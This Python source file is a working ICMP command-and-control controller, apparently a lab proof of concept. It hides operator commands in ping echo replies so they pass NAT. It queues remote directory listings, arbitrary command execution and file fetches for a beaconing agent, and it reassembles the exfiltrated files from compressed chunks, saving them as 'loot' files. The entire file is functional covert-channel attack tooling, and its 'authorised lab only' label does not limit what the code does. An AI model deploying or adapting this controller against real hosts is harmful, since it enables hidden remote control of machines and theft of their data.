#!/usr/bin/env python3
"""
controller.py — ICMP C2 controller (teaching / authorised-lab PoC).

Listens for agent CMD!BEACON|<id>, learns src IP (unless --lock-target),
queues menu tasks, dispatches on next beacon. zlib-chunked streams over
ICMP (START/CHUNK/END), RETRY/ACK, busy lock.

NAT note: commands/ACK/RETRY are sent as ICMP echo *replies* (type 0)
matching the agent's request id/seq so home NAT conntrack can deliver them.
New type-8 requests to a residential public IP are usually dropped.
"""

from __future__ import annotations

import argparse
import atexit
import os
import subprocess
import sys
import threading
import zlib

from scapy.all import ICMP, IP, Raw, send, sniff

TRIGGER_MARKER = b"CMD!"

TARGET_IP = ""
IFACE = ""
LOCK_TARGET = False

received_chunks: dict = {}
current_filename = b""
expected_max_seq = 0
stream_lock = threading.Lock()
stream_busy = False
pending_cmd: str | None = None
last_agent_id = ""


def toggle_kernel_icmp(state: str) -> None:
    try:
        subprocess.run(
            ["sysctl", "-w", f"net.ipv4.icmp_echo_ignore_all={state}"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        status = "DISABLED (channel isolated)" if state == "1" else "RESTORED"
        print(f"[*] Kernel ICMP echo replies: {status}.")
    except Exception as e:
        print(f"[-] Warning: could not adjust icmp_echo_ignore_all: {e}")


def restore_kernel_icmp() -> None:
    toggle_kernel_icmp("0")


def shutdown_sequence() -> None:
    print("\n[*] Restoring kernel ICMP and exiting...")
    restore_kernel_icmp()
    print("[+] Done.")
    os._exit(0)


def send_icmp_reply(dst: str, icmp_id: int, icmp_seq: int, cmd_string: str) -> None:
    """Send CMD! as ICMP echo reply (type 0) matching request id/seq — NAT-friendly."""
    pkt = (
        IP(dst=dst)
        / ICMP(type=0, id=icmp_id, seq=icmp_seq)
        / Raw(load=TRIGGER_MARKER + cmd_string.encode())
    )
    send(pkt, iface=IFACE, verbose=False)


def send_trigger(cmd_string: str) -> None:
    """Fallback: new type-8 request (no live request to reply to). Prefer send_icmp_reply."""
    if not TARGET_IP:
        print("[-] No agent IP yet — wait for a BEACON.")
        return
    pkt = (
        IP(dst=TARGET_IP)
        / ICMP(type=8, id=0xC200)
        / Raw(load=TRIGGER_MARKER + cmd_string.encode())
    )
    send(pkt, iface=IFACE, verbose=False)


def packet_handler(packet) -> None:
    global received_chunks, current_filename, expected_max_seq, stream_busy
    global TARGET_IP, pending_cmd, last_agent_id

    if not packet.haslayer(IP) or not packet.haslayer(Raw):
        return

    raw_load = packet[Raw].load
    if TRIGGER_MARKER not in raw_load:
        return

    idx = raw_load.find(TRIGGER_MARKER)
    data = raw_load[idx + len(TRIGGER_MARKER) :]

    icmp_id = int(packet[ICMP].id) if packet.haslayer(ICMP) else 0xC200
    icmp_seq = int(packet[ICMP].seq) if packet.haslayer(ICMP) else 0
    src = packet[IP].src

    # Agent beacon: learn src IP, dispatch queued task as type-0 reply (NAT)
    if data.startswith(b"BEACON|"):
        agent_id = data[7:].decode("utf-8", errors="ignore")
        last_agent_id = agent_id
        if LOCK_TARGET and TARGET_IP and src != TARGET_IP:
            return
        if not LOCK_TARGET and src != TARGET_IP:
            # Only announce IP changes — quiet on routine beacons
            print(f"\n[+] Beacon from {src} id={agent_id}"
                  + (f" (was {TARGET_IP})" if TARGET_IP else ""))
            TARGET_IP = src
        with stream_lock:
            cmd = pending_cmd
            busy = stream_busy
        if cmd and not busy and TARGET_IP:
            with stream_lock:
                pending_cmd = None
            # send() from inside sniff prn can fail/reenter — dispatch off-thread
            def _dispatch(c=cmd, d=src, iid=icmp_id, iseq=icmp_seq):
                send_icmp_reply(d, iid, iseq, c)
                print(f"\n[+] Dispatched on beacon (echo-reply): {c}")
            threading.Thread(target=_dispatch, daemon=True).start()
        return

    if not TARGET_IP or src != TARGET_IP:
        return

    if data.startswith(b"[START]"):
        try:
            meta, name = data[7:].split(b"|", 1)
            with stream_lock:
                expected_max_seq = int(meta.decode())
                current_filename = name
                received_chunks = {}
                stream_busy = True
            print(
                f"\n[+] Stream start: {current_filename.decode(errors='ignore')} "
                f"({expected_max_seq} frames)"
            )
        except Exception as e:
            print(f"\n[-] Bad START frame: {e}")
        return

    if data.startswith(b"[CHUNK]"):
        if not packet.haslayer(ICMP):
            return
        seq_id = int(packet[ICMP].seq)
        with stream_lock:
            if not stream_busy:
                return
            received_chunks[seq_id] = data[7:]
        sys.stdout.write(".")
        sys.stdout.flush()
        return

    if data.startswith(b"[END]"):
        with stream_lock:
            if not stream_busy:
                return
            missing = [i for i in range(expected_max_seq) if i not in received_chunks]
            filename = current_filename
            max_seq = expected_max_seq
            chunks_snapshot = dict(received_chunks)

        if missing:
            retry_string = ",".join(str(i) for i in missing)
            print(f"\n[!] Missing frames {retry_string}; requesting RETRY")
            # Reply to END packet so NAT delivers RETRY
            def _retry(d=src, iid=icmp_id, iseq=icmp_seq, rs=retry_string):
                send_icmp_reply(d, iid, iseq, f"RETRY|{rs}")
            threading.Thread(target=_retry, daemon=True).start()
            return

        print("\n[+] Stream complete; decompressing...")
        try:
            compressed = b"".join(chunks_snapshot[i] for i in range(max_seq))
            original = zlib.decompress(compressed)
            if filename in (b"ls_output.txt", b"command_log.txt"):
                print(f"\n[Agent output]:\n\n{original.decode('utf-8', errors='ignore')}\n")
            else:
                out_name = f"loot_{filename.decode(errors='ignore')}"
                with open(out_name, "wb") as f:
                    f.write(original)
                print(f"\n[+] Wrote '{out_name}' ({len(original)} bytes)")

            def _ack(d=src, iid=icmp_id, iseq=icmp_seq):
                send_icmp_reply(d, iid, iseq, "ACK|DONE")
            threading.Thread(target=_ack, daemon=True).start()
        except Exception as e:
            print(f"[-] Decompress failed: {e}")
        finally:
            with stream_lock:
                stream_busy = False
                received_chunks = {}
                current_filename = b""
                expected_max_seq = 0


def background_sniffer() -> None:
    sniff(iface=IFACE, filter="icmp", prn=packet_handler, store=0)


def parse_args():
    ap = argparse.ArgumentParser(
        description="ICMP C2 controller — authorised lab / coursework only."
    )
    ap.add_argument(
        "--target",
        default=os.environ.get("ICMP_C2_TARGET"),
        help="Optional initial agent IP (or env ICMP_C2_TARGET). "
        "Updated from BEACON unless --lock-target.",
    )
    ap.add_argument(
        "--iface",
        default=os.environ.get("ICMP_C2_IFACE"),
        help="Sniff/send interface, e.g. ens5 or vboxnet1 (or env ICMP_C2_IFACE)",
    )
    ap.add_argument(
        "--lock-target",
        action="store_true",
        help="Do not update TARGET_IP from agent beacons",
    )
    return ap.parse_args()


def main() -> None:
    global TARGET_IP, IFACE, LOCK_TARGET, pending_cmd

    args = parse_args()
    if os.geteuid() != 0:
        sys.exit("[-] Needs root (sudo).")

    if not args.iface:
        sys.exit(
            "[-] Set --iface (or ICMP_C2_IFACE). "
            "--target is optional when agents beacon."
        )
    TARGET_IP = args.target or ""
    IFACE = args.iface
    LOCK_TARGET = bool(args.lock_target)

    toggle_kernel_icmp("1")
    atexit.register(restore_kernel_icmp)

    threading.Thread(target=background_sniffer, daemon=True).start()
    tgt = TARGET_IP or "(waiting for BEACON)"
    print(f"[+] Sniffing ICMP on {IFACE}; target {tgt}"
          + (" [locked]" if LOCK_TARGET else " [dynamic from beacon]"))
    print("[*] Dispatch/ACK/RETRY use ICMP echo-reply (type 0) for NAT traversal.")

    while True:
        try:
            print("\n=== ICMP C2 lab menu ===")
            print("1: List Directory (ls) | 2: Run Command | 3: Fetch File | 4: Exit & Restore")
            if TARGET_IP:
                print(f"    (agent {TARGET_IP}"
                      + (f" id={last_agent_id}" if last_agent_id else "")
                      + ")")
            choice = input("> ").strip()

            if choice == "4":
                shutdown_sequence()

            if choice not in ("1", "2", "3"):
                continue

            with stream_lock:
                busy = stream_busy
                waiting = pending_cmd is not None
            if busy:
                print("[!] Stream still in progress; wait for it to finish.")
                continue
            if waiting:
                print(f"[!] Already queued: {pending_cmd} — wait for next beacon.")
                continue

            argument = input("Parameter/path: ").strip()
            if choice == "1":
                cmd = f"LS|{argument or '.'}"
            elif choice == "2":
                if not argument:
                    print("[-] Need a command.")
                    continue
                cmd = f"RUN|{argument}"
            else:
                if not argument:
                    print("[-] Need a path.")
                    continue
                cmd = f"SEND|{argument}"

            with stream_lock:
                pending_cmd = cmd
            print(f"[+] Queued for next agent beacon: {cmd}")
        except (KeyboardInterrupt, SystemExit):
            shutdown_sequence()


if __name__ == "__main__":
    main()
